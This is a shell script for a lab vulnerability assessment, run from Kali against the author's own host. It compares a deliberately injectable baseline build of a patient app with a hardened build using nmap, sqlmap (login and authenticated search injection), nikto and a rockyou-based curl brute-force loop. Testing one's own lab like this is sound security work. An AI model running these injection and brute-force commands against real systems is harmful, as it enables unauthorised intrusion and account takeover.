#!/bin/sh
# Runs the CLI parts of docs/KALI_TEST_PLAN.md from the Kali VM against our own lab host only.
# Usage (on Kali): sh kali_run.sh <host-ip> ravi <ravi's baseline password>
# Use the receptionist: the baseline only builds the search SQL unsafely for that role.
H=${1:-192.168.56.1}; U=${2:-ravi}; P=$3
[ -n "$P" ] || { echo "usage: sh kali_run.sh <host-ip> ravi <ravi's baseline password>" >&2; exit 2; }
B=http://$H:5444; S=https://$H:5443
E=$HOME/vapt-evidence; mkdir -p "$E"; cd "$E" || exit 1
step() { echo "=== $(date '+%F %T') $1" | tee -a run.log; }

step "nmap full port scan"
# -n: the isolated lab has no DNS server; without it nmap stalls on reverse lookups
nmap -n -Pn -T4 --min-rate 1000 -p- "$H" -oN nmap_ports.txt >/dev/null
nmap -n -Pn -sV -p 5443,5444 "$H" -oN nmap_app_ports.txt >/dev/null
step "nmap headers/methods"
nmap -n -Pn --script http-headers,http-methods -p 5444 "$H" -oN nmap_http_baseline.txt >/dev/null
nmap -n -Pn --script http-headers,http-methods,ssl-enum-ciphers -p 5443 "$H" -oN nmap_https_hardened.txt >/dev/null

step "curl headers + cookies"
curl -s -D - -o /dev/null "$B/login" > headers_baseline.txt
curl -sk -D - -o /dev/null "$S/login" > headers_hardened.txt

step "sqlmap baseline login (confirm injection)"
# --ignore-code=401: a failed login answers 401, which sqlmap otherwise treats as "stop"
# --flush-session: the runs share one --output-dir, so without this a later target replays this
# target's cached injection point instead of being tested for real (false positive on the hardened build)
# No --dump: the login's 302/401/200 answers confuse sqlmap's oracle so it falls back to a time-based
# blind dump that crawls for hours. Confirming the injection is the evidence; the auth bypass it
# enables is shown directly by vapt/login_injection_proof.sh.
sqlmap -u "$B/login" --data="username=x&password=x" -p username --ignore-code=401 --flush-session --batch --risk=3 --level=5 \
  --output-dir="$E/sqlmap" > sqlmap_baseline_login.txt 2>&1

step "sqlmap baseline patient search (authenticated; pass the RECEPTIONIST, whose search is the injectable one)"
rm -f jar; curl -s -c jar -o /dev/null "$B/login"
code=$(curl -s -b jar -c jar -o /dev/null -w '%{http_code}' \
  --data-urlencode "username=$U" --data-urlencode "password=$P" "$B/login")
C=$(awk '$6=="sh_session"{print $7}' jar)
if [ "$code" = "302" ] && [ -n "$C" ]; then     # 302 = logged in; a wrong password answers 401
  echo "logged in as $U: yes" >> run.log
  # --tables, not --dbs: SQLite has no separate databases to list
  sqlmap -u "$B/patients/?q=x" -p q --cookie="sh_session=$C" --flush-session --batch --tables \
    --output-dir="$E/sqlmap" > sqlmap_baseline_search.txt 2>&1
  # sqlmap at this default level can miss it (the injection 500s and it gives up); the lone-quote 500
  # vs tautology full-page is proved directly by vapt/search_injection_proof.sh
else
  echo "LOGIN FAILED as $U on the baseline (HTTP $code): check the password; search test skipped" | tee -a run.log
fi

step "sqlmap hardened login (fresh CSRF token per request)"
# --delay=7 keeps under the 10/min login limit, so a 429 is never mistaken for "not injectable"
sqlmap -u "$S/login" --data="csrf_token=x&username=x&password=x" -p username --csrf-token=csrf_token \
  --csrf-url="$S/login" --ignore-code=401 --delay=7 --flush-session --batch --output-dir="$E/sqlmap" > sqlmap_hardened_login.txt 2>&1

step "nikto"
nikto -h "$B" -o nikto_baseline.txt -Format txt >/dev/null 2>&1
nikto -h "$S" -ssl -o nikto_hardened.txt -Format txt >/dev/null 2>&1

step "baseline brute force (top-100 rockyou + the real password planted last; plain curl, not hydra)"
# hydra's http-post-form misreads the baseline's 401-on-failed-login as HTTP auth and logs nothing
# useful; a plain loop is exact. A wrong password answers 401, the right one 302. The baseline never
# rate-limits or locks out, so every attempt runs and the planted password is found at the end.
# (a pipeline's status is head's, so "zcat | head || ..." never fell back: test for the file instead)
if [ -f /usr/share/wordlists/rockyou.txt ]; then head -100 /usr/share/wordlists/rockyou.txt > words.txt
else zcat /usr/share/wordlists/rockyou.txt.gz 2>/dev/null | head -100 > words.txt; fi
echo "$P" >> words.txt
: > brute_baseline.txt; n=0; hit=
while IFS= read -r pw; do
  n=$((n+1))
  c=$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode "username=$U" --data-urlencode "password=$pw" "$B/login")
  printf '%4d  HTTP %s  %s\n' "$n" "$c" "$pw" >> brute_baseline.txt
  [ "$c" = "302" ] && { hit=$pw; break; }
  [ "$c" = "429" ] && { echo "rate-limited at attempt $n (unexpected on the baseline)" >> brute_baseline.txt; break; }
done < words.txt
echo "--- baseline: $n attempts, none blocked; password found: ${hit:-NONE}" | tee -a brute_baseline.txt | tee -a run.log
# The hardened build locks the account and rate-limits instead: evidenced by vapt/live_attack.py and
# the SOC dashboard alert, not here (its per-request CSRF token also defeats a simple loop).

step "done"
